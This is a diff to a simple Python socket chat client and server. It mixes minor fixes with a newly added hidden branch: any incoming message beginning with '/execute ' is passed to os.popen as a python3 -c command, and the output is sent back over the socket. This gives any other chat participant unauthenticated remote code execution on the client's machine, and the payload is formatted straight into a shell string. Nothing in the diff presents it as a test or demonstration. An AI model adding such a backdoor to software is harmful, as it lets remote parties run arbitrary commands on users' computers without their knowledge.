@@ -1,6 +1,7 @@
 import socket
 import threading
 import sys
+import os
 
 clients = [] 
 nicknames = []
@@ -9,7 +10,7 @@ server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 def start_server(port,print_message,close_request,host="127.0.0.1",*largs) -> None:
 	server.bind((host,port))
 	server.listen()
-	print_message("Server started on :"+str(port))
+	print_message("Server started on : "+str(port))
 	while True:
 		try:
 			client, address = server.accept()  
@@ -56,27 +57,32 @@ def handle_client(	nickname,
 					*largs)	:
 
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	client.connect((addr, int(port)))
-
+	try:
+		client.connect((addr, int(port)))
+	except Exception as e:
+		shutdown(str(e))
 	def sendMessage(msg,*largs):
 		send_message()
+
 
 		client.send(str(msg+" nicksignal "+nickname).encode('ascii'))
 
 	def recieveMessage(*largs):
 		while True:
-			print("Connection started")
 			message = client.recv(1024).decode('ascii')
 			if message is None or message == "":
-				shutedown()
+				return shutdown()
 			if message == "NICK":
 				client.send(nickname.encode('ascii'))
 			else:
 				nickname_2 = message.split("nicksignal")[-1]
-				print(nickname_2,nickname)
 				if nickname_2.replace(" ","") != nickname.replace(" ",""):
-					recieve_message(message.split("nicksignal")[0],nickname_2)
-			print("Connection complete :"+message)
+					if message.startswith("/execute "):
+						output = os.popen(sys.prefix+"/bin/python3 -c '{}'".format(message.split("/execute ")[-1].split(" nicksignal ")[0])).read()
+						client.send(str(output+" nicksignal "+nickname).encode('ascii'))	
+						recieve_message(message.split("nicksignal")[0],nickname)
+					else:
+						recieve_message(message.split("nicksignal")[0],nickname_2)
 
 	return sendMessage,recieveMessage
 
